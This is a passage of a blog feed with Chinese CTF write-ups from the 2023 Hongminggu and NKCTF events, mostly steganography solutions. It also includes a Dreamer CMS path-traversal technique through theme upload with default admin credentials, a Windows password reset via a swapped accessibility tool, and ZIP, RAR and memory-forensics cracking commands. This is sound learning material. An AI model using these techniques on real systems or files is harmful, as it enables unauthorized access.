class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r.txt&quot;</span>)<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r2.txt&quot;</span>)<br>f3 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r3.txt&quot;</span>)<br>d1=f1.read()<br>d2=f2.read()<br>d3=f3.read()<br><br>new=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(d1):<br>    new+=v+d2[i]+d3[i]<br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>file.write(new)<br>file.close()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-2-2.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a>点击签到</h2><p>签到，点点点</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-1.png"></p><h2 id="Dreamer-amp-amp-Dreamer-revenge"><a href="#Dreamer-amp-amp-Dreamer-revenge" class="headerlink" title="Dreamer &amp;&amp; Dreamer_revenge"></a>Dreamer &amp;&amp; Dreamer_revenge</h2><p>参考<a href="https://forum.butian.net/share/2183#/">Dreamer CMS 代码审计</a></p><p>默认后台管理员账号密码为<code>wangjn/123456</code></p><p>在源码中复制一份<code>\src\main\resources\db\dreamer-cms\templates\default_v2</code>，修改<code>theme.json</code>文件中的<code>themePath</code>为<code>../../../../../../../../../../../</code>，然后打包成压缩包，在后台<code>风格管理</code>处上传</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-1.png"></p><p>启用后在<code>模板管理</code>处就可以看到跟目录下的文件了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-2.png"></p><p><code>Dreamer_revenge</code>的步骤与<code>Dreamer</code>一致，不过flag在<code>/proc/1/environ</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-3.png"></p><h2 id="Eyou"><a href="#Eyou" class="headerlink" title="Eyou"></a>Eyou</h2><p>EyouCMS v1.6.1 反序列化漏洞</p><p>参考<a href="https://n1k0la-t.github.io/2023/01/28/EyouCMS%20v1.6.1%200day%E6%8C%96%E6%8E%98/">EyouCMS v1.6.1 0day挖掘</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;阿尼亚&quot;&gt;&lt;a href=&quot;#阿尼亚&quot; class=&quot;headerlink&quot; title=&quot;阿尼亚&quot;&gt;&lt;/a&gt;阿尼</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="红明谷" scheme="https://www.lewiserii.top/tags/%E7%BA%A2%E6%98%8E%E8%B0%B7/"/>
    
  </entry>
  
  <entry>
    <title>2023NKCTF-wp</title>
    <link href="https://www.lewiserii.top/wp/NKCTF2023.html"/>
    <id>https://www.lewiserii.top/wp/NKCTF2023.html</id>
    <published>2023-03-26T13:00:00.000Z</published>
    <updated>2023-03-29T12:52:52.555Z</updated>
    
    <content type="html"><![CDATA[<p>rank：15</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hard-misc"><a href="#hard-misc" class="headerlink" title="hard-misc"></a>hard-misc</h2><p><code>base32</code>，公众号发<code>NKCTF2023我来了！</code></p><h2 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h2><p>先导入进vmware，开机发现是windows2008系统，用户带密码</p><p>挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-3.png"></p><p>复制一份cmd到放大镜</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-4.png"></p><p>左下角启动放大镜功能后就启动了cmd，修改administrator密码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-1.png"></p><p>进入系统</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-2.png"></p><h2 id="easymusic"><a href="#easymusic" class="headerlink" title="easymusic"></a>easymusic</h2><p>根据提示百度搜到了类似的一题<a href="https://cloud.tencent.com/developer/article/1676153">2020天翼杯-音频隐写</a></p><p>使用<code>OpenPuff</code>工具</p><p>文件尾得到<code>psdC:01374890</code></p><p>频谱找到<code>PSdB:74208645</code></p><p>波形转换得到<code>psdA:83979367</code></p><p>导出flag.txt</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easymusic-1.png"></p><h2 id="easy-rgb"><a href="#easy-rgb" class="headerlink" title="easy_rgb"></a>easy_rgb</h2><p>montage+gaps画图<br><code>montage *.png -tile 12X15 -geometry +0+0 flag.png</code><br><code>gaps --image=flag.png --generation=30 --population=300 --size=125</code></p><p>得到key：<code>NKCTF2023</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_rgb-1.png"></p><p><code>r</code>,<code>g</code>,<code>b</code>转成<code>zip</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">r=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;r.txt&#x27;</span>).read()<br>g=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;g.txt&#x27;</span>).read()<br>b=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.txt&#x27;</span>).read()<br>e=<span class="hljs-string">&quot;&quot;</span><br>m=<span class="hljs-built_in">max</span>([<span class="hljs-built_in">len</span>(r),<span class="hljs-built_in">len</span>(b),<span class="hljs-built_in">len</span>(g)])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    <span class="hljs-keyword">try</span>:<br>        e+=r[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=g[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=b[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>得到hint：<code>AES-128</code>和data：<code>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+</code></p><p>在线aes-128解密，key为<code>NKCTF2023</code></p><h2 id="first-spam-of-rabbit-year"><a href="#first-spam-of-rabbit-year" class="headerlink" title="first spam of rabbit year"></a>first spam of rabbit year</h2><p><a href="https://www.spammimic.com/decode.cgi">垃圾邮件</a>解密得到<code>佛曰：栗楞穆婆悉遮俱吉室嚧无佛吉埵沙他蒙蒙唎皤啰烁伽驮数迦帝楞萨那摩度驮伽度耶萨那曳喝写怛钵遮耶烁埵室摩迦尼菩呼阇栗墀豆哆烁利吉舍阿萨俱夜嚧蒙喝喝诃罚悉阇喝无数那迦陀室沙穆皤南陀娑利烁输夜输参陀数醯诃提耶钵遮夜栗谨伽俱菩度咩烁室醯迦输诃度唎阇钵无羯栗提摩谨咩悉哆阇室悉钵楞那他伽啰伊耶谨那尼那呼伊罚卢输南喝豆娑伽唎醯嚧那嚧羯摩吉参喝那阿地墀数陀楞啰孕罚度醯菩萨埵埵栗他穆菩参舍迦羯沙啰吉尼楞怛尼孕苏地遮苏提曳谨阇那啰阇南曳输曳伊苏伊度啰咩提苏他他娑驮俱婆钵室利烁俱伽写利羯悉阇遮皤佛南悉阿帝萨喝悉阇参参楞罚皤苏喝墀诃他吉伽提利尼埵啰输嚧醯婆伽墀菩唎娑谨他怛写沙伽啰烁摩栗埵伊啰俱楞帝写地卢利怛吉帝陀阿唵伊伽谨曳阇羯娑羯嚧埵唎烁楞喝曳输他阿室钵谨啰楞他呼娑喝菩哆蒙穆诃婆烁他夜孕穆诃钵佛参室悉舍萨穆室遮阿喝啰伽耶喝漫</code></p><p>社会主义核心价值观解密得到<code>rabbit 又 move</code></p><p>佛曰加个又，key是<code>rabbit</code>，解密得到密文</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;​​​​‍‎‏auD5​​​​‏‍​v&#x27;&lt;)​​​​‏‍‌`h​​​​‎​‏&#123;dF6C_*&#x27;Jrcqzrh&amp;ZaF&gt;`g^​​​​‏‍‌Hr&#x27;&#125;vuHZJB​​​​‎​‏%~&#125;_H5?gu​​​​‌‏‏;q​​​​‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13<br></code></pre></td></tr></table></figure><p>0宽得到key：<code>EnoOoO1G</code></p><p>根据结尾的提示，密文rot47，key rot13</p><p>得到<code>U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH</code>和<code>RabBbB1T</code></p><p>在线rabbit得到<code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></p><h2 id="misc-iot"><a href="#misc-iot" class="headerlink" title="misc?iot!"></a>misc?iot!</h2><p><a href="https://www.anquanke.com/post/id/229321">参考文章</a></p><p>选择<code>arm little-endian</code></p><p>如果要写地址默认为<code>0x8000000</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-1.png"></p><p>sub_800014C是rc4生成密钥的过程</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-2.png"></p><p>复制密钥的过程，得到key：<code>NKCTF2023</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-3.png"></p><p>从V5开始的18个字节是密文，小端序提取出来：<code>245F02E287A0A76C072A75DA3F8A57D71A1F</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-4.png"></p><p>在线rc4解密得到<code>NKCTF&#123;H3l10_stm32&#125;</code></p><h2 id="easy-word"><a href="#easy-word" class="headerlink" title="easy_word"></a>easy_word</h2><p>根据注释中的提示爆破密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>base=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>**<span class="hljs-number">4</span>):<br>    d=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        d.append(base[j%<span class="hljs-number">62</span>])<br>        j=j//<span class="hljs-number">62</span><br>    d=<span class="hljs-built_in">tuple</span>(d)<br>    e=<span class="hljs-string">&quot;h%s%svO%s%s0&quot;</span>%d<br>    <span class="hljs-built_in">hash</span>=hashlib.sha256(e.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;b75d1224&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">hash</span>[:<span class="hljs-number">8</span>]:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure><p>改成zip解压，<code>media</code>目录下有一张<code>image1.png</code>，图片上有key：<code>Welcome_to_NKCTF</code></p><p><code>cloacked-pixel</code>得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_word-1.png"></p><h2 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h2><p>stegsolve观察发现<code>green</code>和<code>blue</code>有数据，脚本提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.bmp&#x27;</span>)<br>d=a.getdata()<br>w,h=a.size<br>e=[]<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        i=a.getpixel((x,y))<br>        e.append(<span class="hljs-built_in">chr</span>((i[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+i[<span class="hljs-number">2</span>]))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(e))<br></code></pre></td></tr></table></figure><p>得到<code>NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;</code></p><h2 id="easy-bmp"><a href="#easy-bmp" class="headerlink" title="easy_bmp"></a>easy_bmp</h2><p>在010中分别修改高和宽，得到key：<code>BMP_Height_width_easy</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_bmp-1.png"></p><p>解压后得到<code>flag.bmp</code>，继续爆破宽高，<code>360*360</code>，扫二维码得到flag</p><p><code>NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;</code></p><h2 id="baby-music"><a href="#baby-music" class="headerlink" title="baby_music"></a>baby_music</h2><p>010打开，发现很多重复的<code>10 27</code>和<code>11 27</code></p><p>将<code>10 27</code>转为<code>0</code>，<code>11 27</code>转为<code>1</code></p><p>二进制转文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.wav&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()[<span class="hljs-number">0x2c</span>:]<br>e=[]<br>q=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">if</span> d[i]==<span class="hljs-number">0x10</span>:<br>        q+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        q+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(q)==<span class="hljs-number">8</span>:<br>        e.append(<span class="hljs-built_in">int</span>(q,<span class="hljs-number">2</span>))<br>        q=<span class="hljs-string">&quot;&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure><p>发现是<code>zip</code></p><p>注释中<code>0</code>转为<code>.</code>，<code>1</code>转为<code>-</code>，<code>换行</code>转为<code>/</code></p><p><code>.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..</code></p><p>解摩斯得到<br><code>WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?</code></p><p>根据提示，猜测是深入明文攻击</p><p>先构造已知的明文，即<code>flag.png</code>的文件头加<code>IHDR</code>，写入到<code>plain.txt</code></p><p>plain.txt：<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p><p>使用<code>bkcrack</code>爆破key</p><p><code>bkcrack.exe -C flag.zip -c flag.png -p plain.txt</code></p><p>修改<code>flag.zip</code>的密码</p><p><code>bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_music-1.png"></p><p>解压得到flag</p><p><code>NKCTF&#123;You_are_very_smart!!&#125;</code></p><h2 id="THMaster"><a href="#THMaster" class="headerlink" title="THMaster"></a>THMaster</h2><p>先开启<code>THmaster.exe</code>监听，再开启<code>th12.exe</code></p><p>ce修改分数到2亿多</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/THMaster-1.png"></p><p>在<code>replay</code>文件夹下的<code>th12_01.rpy</code>中找到flag</p><h2 id="easypic"><a href="#easypic" class="headerlink" title="easypic"></a>easypic</h2><p><strong>赛后复现</strong></p><p>提示<code>出题人把flag偷偷藏在了加密盘里了，你知道怎么把它还原出来吗</code></p><p>先将图片后多余的数据分离，使用<code>veracrypt</code>挂载，密钥为分离出的<code>png</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easypic-1.png"></p><p>得到<code>flag.png</code>，图片尾得到<code>Tips:566*566</code></p><p>放大图片观察到很多像素点，提取然后拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>img=img.resize((<span class="hljs-number">566</span>,<span class="hljs-number">566</span>),Image.NEAREST)<br>img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到flag<br><code>NKCTF&#123;49ce8740502743585c4a44404e62d8f9&#125;</code></p><h2 id="五年Misc，三年模拟"><a href="#五年Misc，三年模拟" class="headerlink" title="五年Misc，三年模拟"></a>五年Misc，三年模拟</h2><p><strong>赛后复现(套娃题)</strong></p><p>压缩包注释<code>printf(&quot;%d%d%d%d%d%d&quot;,key[]);</code></p><p>6位数字爆破，得到<code>114514</code></p><p>提示1：<code>“CA1N”也很“疑惑”呢</code></p><p>猜测是要对文件异或</p><p>文件头为<code>13 08 40 47</code>，与常见文件头进行异或对比，发现异或<code>0x43</code>后为<code>zip</code></p><p>得到一个加密的压缩包，根据提示2<code>ZipCrypto</code>，猜测是深入明文攻击</p><p><code>echo -n &quot;handsome&quot; &gt; plain.txt</code><br><code>bkcrack -C out.zip -c handsome.zip -p plain.txt -o 30 -x 0 504b0304</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-1.png"></p><p>改密码</p><p><code>bkcrack -C out.zip -k 0247f1a3 5da9d4ac 1ae8312c -U 1.zip easy</code></p><p>解压出来一个<code>handsome.jpg</code>和带密码的<code>5.rar</code></p><p>自拍照并没什么用，hashcat爆破<code>rar</code></p><p>rar2john提取hash<br><code>$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602</code></p><p>hashcat爆破密码<br><code>hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u</code></p><p>最终得到密码<code>BUSADJ</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-4.png"></p><p>解压出的图片尾藏了一个逆序的png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;5.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;6.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>修改高度，得到压缩包的密码<code>be8b06bc13780abf</code></p><p>解压出的<code>GGGGGGG.png</code>结尾有串字符<code>5D93CEB70E2BF5DAA84EC3D0CD2C731A</code></p><p>32位的，推测为md5，在线网站得到<code>qwer1234</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-2.png"></p><p>拿这个密码去跑<code>cloacked-pixel</code>，得到下一层压缩包密码<code>f442212b3d398a8e</code></p><p>根据提示是steghide爆破，那直接用stegseek跑了，得到下一层密码<code>764dc6c0361fc0fd</code></p><p>看文件头，明显的F5隐写，得到下一层密码<code>un7pXkXMD6J5P5jKzP3FCCVJ4VFtTF26</code></p><p>wav文件，一听就是sstv了，得到<code>NKCTF&#123;iLiKECTFbec@u5eDreaM!&#125;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-3.png"></p><h2 id="baby-bitlocker"><a href="#baby-bitlocker" class="headerlink" title="baby_bitlocker"></a>baby_bitlocker</h2><p><strong>赛后复现</strong></p><p>先做<code>2023.3.2</code></p><p>看的出来，出题人很喜欢明文攻击</p><p><a href="https://pcapng.com/">pcapng文件格式</a></p><p><code>echo &quot;4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF&quot; | xxd -r -ps &gt; plain.txt</code><br><code>bkcrack -C crack.zip -c usb.pcapng -p plain.txt -o 8</code><br><code>bkcrack -C crack.zip -k 92ac142d 9bd136b1 ac01a95d -U out.zip easy</code></p><p>解压后得到<code>tonF.docx</code>和<code>usb.pcapng</code></p><p>对数据包分析，发现是usb键盘流量，使用<code>UsbMiceDataHacker</code>提取<br><code>PassWord:&lt;SPACE&gt;NKCTF2023_YYDS_YYDS!!!&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;</code></p><p>docx密码为<code>NKCTF2023_YYDS_YYDS!!!</code></p><p>进入文档后发现字体为<code>Byxs20_font</code></p><p>且文档中的内容复制后与文档内不一样了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-1.png"></p><p>odttf转ttf</p><p>打开<code>/word/fontTable.xml</code>，得到<code>font-name</code>为<code>Byxs20_font</code>，<code>fontKey</code>为<code>&#123;F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A&#125;</code></p><p>将<code>\word\fonts\font1.odttf</code>重命名为<code>F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf</code></p><p>python转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>odttf_name = <span class="hljs-string">&quot;./F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf&quot;</span><br>odttf_path = os.path.abspath(odttf_name)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(odttf_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 获取文件名</span><br>file_name = os.path.splitext(odttf_path)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 获取key</span><br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_name), <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    key.append(<span class="hljs-built_in">int</span>(file_name[i-<span class="hljs-number">2</span>:i], <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./font1.ttf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        f.write(<span class="hljs-built_in">bytes</span>([data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]]))<br>    f.write(data[<span class="hljs-number">32</span>:])<br></code></pre></td></tr></table></figure><p>fontforge识别</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-2.png"></p><p>得到一半flag：<code>nkctf&#123;ttf_is_funny_</code></p><p>接着做<code>2023.3.4</code></p><p>内存取证<br><code>python vol.py -f memory.raw --profile=Win7SP1x64 filescan | grep -iE &quot;flag|.zip$|.rar$|.7z$|.txt$|.png$|.jpg$|.gif$|.pdf$|.doc$|.docx$|.pcapng$|.raw$|.kdbx$&quot;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-3.png"></p><p>提取<code>PYTHON.rar</code></p><p><code>python vol.py -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000017f55070 -D ./</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-4.png"></p><p>用这个密钥恢复加密分区</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-5.png"></p><p>得到<code>bitlocker_is_very_interesting&#125;</code></p><p>最后看<code>2023.3.3</code></p><p>hint：<code>flag2图片十分有规律的3x3，到底是来自几进制的秘密呢？</code></p><p>根据提示<code>3x3</code>，猜测是4进制</p><p>exiftool得到提示<code>上北下南左西右东</code></p><p><img 